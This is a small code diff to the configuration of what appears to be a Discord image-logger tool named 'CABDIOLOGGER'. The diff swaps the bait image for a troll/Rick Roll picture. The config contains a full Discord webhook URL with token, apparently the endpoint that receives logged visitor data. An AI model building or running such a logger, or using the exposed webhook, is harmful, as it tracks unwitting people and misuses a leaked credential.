@@ -11,7 +11,7 @@ __author__ = "cabdio"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1537827107118391441/fkTim78w3VJfRQjmvAgabEv0XSxLK5kG_-VrDUjA1QdJ6fdyJ-QyO_jCKByYREuT1m8N",
-    "image": "https://tse3.mm.bing.net/th/id/OIP.syn-J1vvrZ678qLerFM3OwHaEK?r=0&rs=1&pid=ImgDetMain&o=7&rm=3", 
+    "image": "https://www.pngkey.com/png/detail/58-583069_trollface-png-transparent-images-rick-roll-troll.png", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
